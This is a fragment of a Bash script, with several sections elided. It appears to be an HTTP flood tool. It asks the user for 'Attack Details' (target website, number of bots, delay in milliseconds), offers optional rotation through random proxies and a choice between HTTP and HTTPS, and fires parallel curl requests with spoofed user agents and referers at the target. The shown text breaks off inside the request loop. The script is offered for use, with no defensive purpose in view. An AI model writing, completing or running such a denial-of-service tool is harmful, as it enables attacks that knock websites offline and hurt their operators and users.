...
ask_use_proxy() {
    read -p "Do you want to use a proxy? (y/n): " use_proxy_choice
    case $use_proxy_choice in
        [yY]) use_proxy=true;;
        [nN]) use_proxy=false;;
        *) color_echo "Invalid choice. Defaulting to not using a proxy." && use_proxy=false;;
    esac
}
    ...
    if $use_proxy; then
        if [ -f "$proxy_file" ]; then
            ...
            if [ ${#proxies[@]} -eq 0 ]; then
                color_echo "No proxies available. Running without a proxy."
                use_proxy=false
            else
                proxy=$(shuf -n 1 "$proxy_file")
            fi
        else
            color_echo "Proxy file not found. Running without a proxy."
            use_proxy=false
        fi
    fi
}
...
color_echo "| 2  | HTTP/2     |"
color_echo "+----+------------+"
read -p "Enter the number corresponding to your choice: " protocol_choice

# Set protocol based on user choice
case $protocol_choice in
    1) protocol="http";;
    2) protocol="https";;
    *) color_echo "Invalid choice. Defaulting to HTTP." && protocol="http";;
esac

# Prompt for attack details
color_echo "Enter Attack Details for $protocol"
color_echo "---------------------------------"
read -p "Target Web : " ip
read -p "Number of Bots: " max
read -p "Delay (milliseconds, minimum 10ms): " delay
...
send_traffic_http() {
    ...
    do
      (for ((j=1; j<=threads; j++)); do
        ...
        if $use_proxy; then
          if curl -s -L -A "$user_agent" -e "$referer" -x "$proxy" -o /dev/null --connect-timeout 5 "$protocol://$ip"; then
